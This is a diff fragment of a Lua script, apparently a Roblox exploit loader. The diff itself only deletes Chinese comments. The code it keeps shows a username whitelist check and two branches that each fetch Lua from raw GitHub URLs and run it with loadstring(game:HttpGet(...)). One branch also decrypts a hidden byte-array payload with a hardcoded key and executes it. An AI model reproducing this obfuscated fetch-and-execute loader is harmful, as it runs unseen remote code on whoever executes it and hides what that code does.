@@ -42,7 +42,6 @@ local function IsWhitelisted(name)
     return false
 end
 
--- ✅ 安全的 Hex 解码
 local function DecodeHex(hex)
     local result = {}
     for i = 1, #hex - 1, 2 do
@@ -53,7 +52,6 @@ local function DecodeHex(hex)
     return table.concat(result)
 end
 
--- ✅ 白名单脚本
 local function RunWhitelistedScript()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/ggpp4088/roblox/refs/heads/main/kts.lua'))("")
     local decoded = DecodeHex(h)
@@ -62,7 +60,6 @@ local function RunWhitelistedScript()
     end
 end
 
--- ❌ 非白名单脚本
 local function RunNoWhitelistScript()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/ggpp4088/roblox/refs/heads/main/kk.lua'))("")
     local k1 = {83,71,45,116,52,114,70,103,55,119,80,100,51,108,75,98}
@@ -93,7 +90,6 @@ local function RunNoWhitelistScript()
     loadstring(table.concat(decrypted))()
 end
 
--- ✅ 执行判断
 if IsWhitelisted(Username) then
     Notify("白名单验证", "欢迎, " .. Username, 4)
     RunWhitelistedScript()
